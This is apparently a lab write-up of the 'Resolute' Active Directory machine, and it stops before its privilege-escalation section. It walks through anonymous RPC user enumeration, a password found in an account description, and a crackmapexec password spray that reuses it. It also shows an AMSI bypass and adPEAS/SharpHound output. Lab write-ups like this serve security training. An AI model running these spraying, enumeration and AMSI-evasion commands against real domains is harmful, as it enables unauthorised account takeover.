# Resolute (Medium)

RPC Null Authentication -> User Enumeratino -> marko:Welcome123! -> Password Spraying -> melanie:Welcome123! -> WinRM ->&#x20;

## Information Gathering

Scanned all TCP ports:

```
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-10-01 00:47:35Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
```

Enumerated UDP ports:

```
PORT    STATE SERVICE VERSION
53/udp  open  domain  (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   NBTStat: 
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
123/udp open  ntp     NTP v3
389/udp open  ldap    Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Notes:

* 53/DNS - Domain <mark style="color:yellow;">megabank.local</mark> add to /etc/hosts
* 88/Kerberos - Exposed, so if we get any users, we should attempt AS-REP, Kerb if we have passwords, etc
  * AS-REP Failed
* 47001/HTTP - Some type of web server
  * Dirsearch did not detect anything
* 5985/WinRM - Valid creds gets us access
* 135/RPC - Can we authenticate using null? Yes Enumerate users and groups
  * Ended up finding password in a description

## Enumeration

### Port 88 - Kerberos

Enum4Linux:

```
enum4linux -a 10.129.60.74

Users:

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]

Groups: 

group:[Account Operators] rid:[0x224]                                                                                                              
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]
```

* I placed the following users into a users file and ran kerbrute userenum against it

```
./kerbrute_linux_amd64 userenum -d megabank.local users --dc 10.129.60.74                     55.1s  Sat 01 Oct 2022 10:42:24 AM EDT

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/01/22 - Ronnie Flathers @ropnop

2022/10/01 10:44:46 >  Using KDC(s):
2022/10/01 10:44:46 >   10.129.60.74:88

2022/10/01 10:44:46 >  [+] VALID USERNAME:       Administrator@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       ryan@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       marcus@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       marko@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       abigail@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       sunita@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       sally@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       angela@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       felicia@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       fred@megabank.local
2022/10/01 10:44:46 >  [+] VALID USERNAME:       gustavo@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       stevie@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       paulo@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       ulf@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       steve@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       claire@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       annette@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       claude@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       per@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       annika@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       zach@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       simon@megabank.local
2022/10/01 10:44:47 >  [+] VALID USERNAME:       naoki@megabank.local
2022/10/01 10:44:47 >  Done! Tested 24 usernames (23 valid) in 0.389 seconds
```

* We can see that they are all valid
* Attempt <mark style="color:yellow;">AS-REP Roasting</mark> -- <mark style="color:red;">failed</mark>
* SMB - No anonymous or Guest
* <mark style="color:yellow;">RPC</mark> - <mark style="color:yellow;">Null Authentication</mark> -- Interesting comment for user <mark style="color:yellow;">marco</mark>

```
rpcclient -U "" -N 10.129.60.74

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]

rpcclient $> querydispinfo
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       
Desc: Account created. Password set to Welcome123!
```

* <mark style="color:yellow;">marco:Welcome123!</mark>
* Attempted SMB authentication with new creds with no luck
* Okay, we have a password, let's password spray with the users that we enumerated earlier

### &#x20;  melanie:Welcome123!

* We have valid SMB credentials for <mark style="color:yellow;">melanie:Welcome123!</mark>

## Exploitation

### Password Spraying SMB

CrackMapExec

```
crackmapexec smb 10.129.60.74 -u users -p 'Welcome123!'

SMB         10.129.60.74    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

* We have valid SMB credentials for <mark style="color:yellow;">melanie:Welcome123!</mark>

### Enum4Linux (Authenticated)

```
enum4linux -a -u "melanie" -p "Welcome123!" 10.129.60.74
```

* Let's upload adPEAS and see what we can see

### Bypass AMSI

```
Bypass-4MSI
```

### adPEAS usage

```
Import-Module .\adPEAS.ps1
Invoke-ADPeas
```

Output:

{% code overflow="wrap" %}
```
[*] +++++ Starting adPEAS Version 0.7.13 +++++
adPEAS version 0.7.13
[*] +++++ Starting Enumeration +++++
[*] +++++ Searching for Domain Information +++++
[*] +++++ Checking Domain +++++
Checking Domain - Details for Domain 'megabank.local':


Domain Name             : megabank.local
Domain SID              : S-1-5-21-1392959593-3013219662-3596683436
Domain Functional Level : Windows 2016
Forest Name             : megabank.local
Forest Children         : No Subdomain[s] available
Domain Controller       : Resolute.megabank.local

[*] +++++ Checking Password and Kerberos Policy +++++
Checking Password Policy - Details for Domain 'megabank.local':
Minimum Password Age    : 1 days
Maximum Password Age    : Disabled
Minimum Password Length : 7 character
Password Complexity     : Disabled
Lockout Account         : Disabled
Reversible Encryption   : Disabled

Checking Kerberos Policy - Details for Domain 'megabank.local':
Maximum Age of TGT            : 10 hours
Maximum Age of TGS            : 600 minutes
Maximum Clock Time Difference : 5 minutes
Krbtgt Password Last Set      : 9/25/2019 6:29:12 AM

[*] +++++ Checking Domain Controller, Sites and Subnets +++++
Checking Domain Controller - Details for Domain 'megabank.local':
DC Host Name  : Resolute.megabank.local
DC IP Address : ::1
Site Name     : Default-First-Site-Name
Domain        : megabank.local

[*] +++++ Checking Forest and Domain Trusts +++++
[*] +++++ Checking DCSync Rights +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync
[*] +++++ Checking GenericAll Rights +++++
[*] https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
[*] +++++ Searching for Certificate Authority Information +++++
[*] +++++ Searching for Enterprise CA +++++
[*] https://posts.specterops.io/certified-pre-owned-d95910965cd2
[*] +++++ Searching for Vulnerable Certificate Templates +++++
[*] +++++ Searching for Credentials Exposure +++++
[*] +++++ Searching for ASREPRoast Users +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast
[*] +++++ Searching for Kerberoastable Users +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast#kerberoast
[*] +++++ Searching for Users with a set 'Linux/Unix Password' attribute +++++
[*] https://www.blackhillsinfosec.com/domain-goodness-learned-love-ad-explorer/
[*] +++++ Searching for Users with a set 'extensionData' attribute +++++
[*] +++++ Searching for Computers with enabled and readable LAPS attribute +++++
[*] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#antivirus-and-detectors
[*] +++++ Searching for Group Managed Service Accounts (gMSA) +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges
[*] +++++ Searching for Crypted Passwords in SYSVOL Group Policy Objects +++++
[*] https://www.andreafortuna.org/2019/02/13/abusing-group-policy-preference-files-for-password-discovery/
[*] +++++ Searching for Sensitive Information in NETLOGON Share +++++
[*] +++++ Searching for Delegation Issues +++++
[*] +++++ Searching for Computers with Unconstrained Delegation Rights +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/unconstrained-delegation
[*] +++++ Searching for Computers with Constrained Delegation Rights +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/constrained-delegation
[*] +++++ Searching for Computers with Resource-Based Constrained Delegation Rights +++++
[*] https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
[*] +++++ Searching for Users with Constrained Delegation Rights +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/constrained-delegation
[*] +++++ Searching for Users with Resource-Based Constrained Delegation Rights +++++
[*] https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
[*] +++++ Starting Account Enumeration +++++
[*] +++++ Starting Domain User Enumeration +++++
[*] +++++ Searching for Searching for Azure AD Connect +++++
[*] https://www.synacktiv.com/en/publications/azure-ad-introduction-for-red-teamers.html
[*] +++++ Searching for Users in High Privileged Groups +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges
Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Administrators':
GroupName         : Enterprise Admins
distinguishedName : CN=Enterprise Admins,CN=Users,DC=megabank,DC=local
description       : Designated administrators of the enterprise
objectSid         : S-1-5-21-1392959593-3013219662-3596683436-519
MemberDomain      : megabank.local

GroupName         : Domain Admins
distinguishedName : CN=Domain Admins,CN=Users,DC=megabank,DC=local
description       : Designated administrators of the domain
objectSid         : S-1-5-21-1392959593-3013219662-3596683436-512
MemberDomain      : megabank.local

sAMAccountName     : Administrator
userPrincipalName  :
distinguishedName  : CN=Administrator,CN=Users,DC=megabank,DC=local
description        : Built-in account for administering the computer/domain
objectSid          : S-1-5-21-1392959593-3013219662-3596683436-500
MemberDomain       : megabank.local
pwdLastSet         : 10/1/2022 10:48:53 AM
lastLogonTimestamp : 9/30/2022 5:29:28 PM
UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

Searching for Users in High Privileged Groups - Members of Group 'MEGABANK\Domain Admins':
sAMAccountName     : Administrator
userPrincipalName  :
distinguishedName  : CN=Administrator,CN=Users,DC=megabank,DC=local
description        : Built-in account for administering the computer/domain
objectSid          : S-1-5-21-1392959593-3013219662-3596683436-500
MemberDomain       : megabank.local
pwdLastSet         : 10/1/2022 10:48:53 AM
lastLogonTimestamp : 9/30/2022 5:29:28 PM
UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

Searching for Users in High Privileged Groups - Members of Group 'MEGABANK\Enterprise Admins':
sAMAccountName     : Administrator
userPrincipalName  :
distinguishedName  : CN=Administrator,CN=Users,DC=megabank,DC=local
description        : Built-in account for administering the computer/domain
objectSid          : S-1-5-21-1392959593-3013219662-3596683436-500
MemberDomain       : megabank.local
pwdLastSet         : 10/1/2022 10:48:53 AM
lastLogonTimestamp : 9/30/2022 5:29:28 PM
UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

Searching for Users in High Privileged Groups - Members of Group 'MEGABANK\Group Policy Creator Owners':
sAMAccountName     : Administrator
userPrincipalName  :
distinguishedName  : CN=Administrator,CN=Users,DC=megabank,DC=local
description        : Built-in account for administering the computer/domain
objectSid          : S-1-5-21-1392959593-3013219662-3596683436-500
MemberDomain       : megabank.local
pwdLastSet         : 10/1/2022 10:48:53 AM
lastLogonTimestamp : 9/30/2022 5:29:28 PM
UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

Searching for Users in High Privileged Groups - Members of Group 'MEGABANK\DnsAdmins':
GroupName         : Contractors
distinguishedName : CN=Contractors,OU=Groups,DC=megabank,DC=local
description       : {Contractors, $null}
objectSid         : S-1-5-21-1392959593-3013219662-3596683436-1103
MemberDomain      : megabank.local

sAMAccountName     : ryan
userPrincipalName  : ryan@megabank.local
distinguishedName  : CN=Ryan Bertrand,OU=Contractors,OU=MegaBank Users,DC=megabank,DC=local
description        :
objectSid          : S-1-5-21-1392959593-3013219662-3596683436-1105
MemberDomain       : megabank.local
pwdLastSet         : 10/1/2022 10:47:57 AM
lastLogonTimestamp :
UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Account Operators':
Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Server Operators':
Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Print Operators':
Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Backup Operators':
Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Hyper-V Administrators':
Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Access Control Assistance Operators':
GroupName         : Contractors
distinguishedName : CN=Contractors,OU=Groups,DC=megabank,DC=local
description       : {Contractors, $null}
objectSid         : S-1-5-21-1392959593-3013219662-3596683436-1103
MemberDomain      : megabank.local

sAMAccountName     : ryan
userPrincipalName  : ryan@megabank.local
distinguishedName  : CN=Ryan Bertrand,OU=Contractors,OU=MegaBank Users,DC=megabank,DC=local
description        :
objectSid          : S-1-5-21-1392959593-3013219662-3596683436-1105
MemberDomain       : megabank.local
pwdLastSet         : 10/1/2022 10:47:57 AM
lastLogonTimestamp :
UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

sAMAccountName     : melanie
userPrincipalName  : melanie@megabank.local
distinguishedName  : CN=Melanie Purkis,CN=Users,DC=megabank,DC=local
description        :
objectSid          : S-1-5-21-1392959593-3013219662-3596683436-10101
MemberDomain       : megabank.local
pwdLastSet         : 10/1/2022 10:48:53 AM
lastLogonTimestamp : 10/1/2022 9:57:06 AM
UserAccountControl : NORMAL_ACCOUNT

Searching for Users in High Privileged Groups - Members of Group 'MEGABANK\Cert Publishers':
[*] +++++ Searching for High Privileged Users where the Password does not expire +++++
[*] https://ldapwiki.com/wiki/DONT_EXPIRE_PASSWORD
[!] The password of account 'Administrator' does not expire
[+] The account 'Administrator' is or was member of a high privileged protected group
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#adminsdholder-group
Searching for High Privileged Users where the Password does not expire - Details for User 'Administrator':
sAMAccountName     : Administrator
userPrincipalName  :
distinguishedName  : CN=Administrator,CN=Users,DC=megabank,DC=local
description        : Built-in account for administering the computer/domain
objectSid          : S-1-5-21-1392959593-3013219662-3596683436-500
userAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
memberOf           : CN=Group Policy Creator Owners,CN=Users,DC=megabank,DC=local
                     CN=Domain Admins,CN=Users,DC=megabank,DC=local
                     CN=Enterprise Admins,CN=Users,DC=megabank,DC=local
                     CN=Schema Admins,CN=Users,DC=megabank,DC=local
                     CN=Administrators,CN=Builtin,DC=megabank,DC=local
pwdLastSet         : 10/1/2022 10:48:53 AM
lastLogonTimestamp : 9/30/2022 5:29:28 PM

[*] +++++ Searching for High Privileged Users which may not require a Password +++++
[*] https://ldapwiki.com/wiki/PASSWD_NOTREQD
[*] +++++ Starting Computer Enumeration +++++
[*] +++++ Searching Domain Controllers +++++
Searching for Domain Controllers - Details for Computer 'RESOLUTE$':
sAMAccountName     : RESOLUTE$
dNSHostName        : Resolute.megabank.local
distinguishedName  : CN=RESOLUTE,OU=Domain Controllers,DC=megabank,DC=local
IPv4Address        : 10.129.60.74
operatingSystem    : Windows Server 2016 Standard
description        :
objectSid          : S-1-5-21-1392959593-3013219662-3596683436-1000
userAccountControl : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION

[*] +++++ Searching for Exchange Servers +++++
[*] +++++ Searching for Enterprise CA Servers +++++
[*] +++++ Starting BloodHound Enumeration +++++
Result                 :
Id                     : 1021
Exception              : System.AggregateException: One or more errors occurred. ---> System.UnauthorizedAccessException: Access to the path 'C:\Windows\system32\20221001104939_containers.json' is denied.
                            at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
                            at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean
                         bFromProxy, Boolean useLongPath, Boolean checkHost)
                            at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost)
                            at System.IO.StreamWriter.CreateFile(String path, Boolean append, Boolean checkHost)
                            at System.IO.StreamWriter..ctor(String path, Boolean append, Encoding encoding, Int32 bufferSize, Boolean checkHost)
                            at System.IO.StreamWriter..ctor(String path, Boolean append, Encoding encoding)
                            at Sharphound.Writers.JsonDataWriter`1.CreateFile()
                            at Sharphound.Writers.BaseWriter`1.<AcceptObject>d__6.MoveNext()
                         --- End of stack trace from previous location where exception was thrown ---
                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
                            at System.Runtime.CompilerServices.TaskAwaiter.GetResult()
                            at Sharphound.Runtime.OutputWriter.<StartWriter>d__17.MoveNext()
                         --- End of stack trace from previous location where exception was thrown ---
                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
                            at System.Runtime.CompilerServices.TaskAwaiter`1.GetResult()
                            at Sharphound.Runtime.CollectionTask.<StartCollection>d__10.MoveNext()
                         --- End of stack trace from previous location where exception was thrown ---
                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
                            at System.Runtime.CompilerServices.TaskAwaiter.GetResult()
                            at Sharphound.SharpLinks.<AwaitBaseRunCompletion>d__6.MoveNext()
                         --- End of stack trace from previous location where exception was thrown ---
                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
                            at System.Runtime.CompilerServices.TaskAwaiter`1.GetResult()
                            at Sharphound.Program.<>c__DisplayClass0_0.<<Main>b__1>d.MoveNext()
                         --- End of stack trace from previous location where exception was thrown ---
                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
                            at CommandLine.ParserResultExtensions.<WithParsedAsync>d__20`1.MoveNext()
                         --- End of stack trace from previous location where exception was thrown ---
                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
                            at System.Runtime.CompilerServices.TaskAwaiter`1.GetResult()
                            at Sharphound.Program.<Main>d__0.MoveNext()
                            --- End of inner exception stack trace ---
                         ---> (Inner Exception #0) System.UnauthorizedAccessException: Access to the path 'C:\Windows\system32\20221001104939_containers.json' is denied.
                            at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
                            at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean
                         bFromProxy, Boolean useLongPath, Boolean checkHost)
                            at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost)
                            at System.IO.StreamWriter.CreateFile(String path, Boolean append, Boolean checkHost)
                            at System.IO.StreamWriter..ctor(String path, Boolean append, Encoding encoding, Int32 bufferSize, Boolean checkHost)
                            at System.IO.StreamWriter..ctor(String path, Boolean append, Encoding encoding)
                            at Sharphound.Writers.JsonDataWriter`1.CreateFile()
                            at Sharphound.Writers.BaseWriter`1.<AcceptObject>d__6.MoveNext()
                         --- End of stack trace from previous location where exception was thrown ---
                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
                            at System.Runtime.CompilerServices.TaskAwaiter.GetResult()
                            at Sharphound.Runtime.OutputWriter.<StartWriter>d__17.MoveNext()
                         --- End of stack trace from previous location where exception was thrown ---
                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
                            at System.Runtime.CompilerServices.TaskAwaiter`1.GetResult()
                            at Sharphound.Runtime.CollectionTask.<StartCollection>d__10.MoveNext()
                         --- End of stack trace from previous location where exception was thrown ---
                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
                            at System.Runtime.CompilerServices.TaskAwaiter.GetResult()
                            at Sharphound.SharpLinks.<AwaitBaseRunCompletion>d__6.MoveNext()
                         --- End of stack trace from previous location where exception was thrown ---
                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
                            at System.Runtime.CompilerServices.TaskAwaiter`1.GetResult()
                            at Sharphound.Program.<>c__DisplayClass0_0.<<Main>b__1>d.MoveNext()
                         --- End of stack trace from previous location where exception was thrown ---
                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
                            at CommandLine.ParserResultExtensions.<WithParsedAsync>d__20`1.MoveNext()
                         --- End of stack trace from previous location where exception was thrown ---
                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
                            at System.Runtime.CompilerServices.TaskAwaiter`1.GetResult()
                            at Sharphound.Program.<Main>d__0.MoveNext()<---

Status                 : Faulted
IsCanceled             : False
IsCompleted            : True
CreationOptions        : None
AsyncState             :
IsFaulted              : True
AsyncWaitHandle        : System.Threading.ManualResetEvent
CompletedSynchronously : False

2022-10-01T10:49:39.6647051-07:00|INFORMATION|Resolved Collection Methods: Group, GPOLocalGroup, Trusts, ACL, Container, ObjectProps
2022-10-01T10:49:39.6801909-07:00|INFORMATION|Initializing SharpHound at 10:49 AM on 10/1/2022
2022-10-01T10:49:50.9347395-07:00|INFORMATION|Flags: Group, GPOLocalGroup, Trusts, ACL, Container, ObjectProps
2022-10-01T10:49:51.0753379-07:00|INFORMATION|Beginning LDAP search for megabank.local
2022-10-01T10:49:51.1221987-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-10-01T10:49:51.1221987-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-10-01T10:50:23.0108029-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 153 MB RAM
2022-10-01T10:50:31.6174306-07:00|INFORMATION|Consumers finished, closing output channel
2022-10-01T10:50:31.6486820-07:00|INFORMATION|Output channel closed, waiting for output task to complete

```
{% endcode %}

## Privilege Escalation

### Local enumeration

### PrivEsc vector

## Proofs
